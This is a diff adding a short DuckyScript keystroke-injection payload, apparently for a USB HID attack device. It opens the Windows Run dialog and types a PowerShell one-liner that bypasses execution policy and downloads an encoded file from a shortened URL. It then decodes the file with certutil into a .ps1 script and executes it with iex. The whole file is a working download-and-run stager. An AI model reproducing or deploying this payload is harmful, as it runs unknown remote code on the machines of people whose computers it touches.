@@ -1,0 +1,8 @@
+REM this script downloads an encoded Base64 file using irm and then decodes it then executes
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -NoP -Ep Bypass iwr t.ly/2rDuD|sc "C:\Users\$env:USERNAME\Desktop\e.txt";certutil -f -decode "C:\Users\$env:USERNAME\Desktop\e.txt" "C:\Users\$env:USERNAME\Desktop\d.ps1";iex "C:\Users\$env:USERNAME\Desktop\d.ps1"
+DELAY 1000
+ENTER
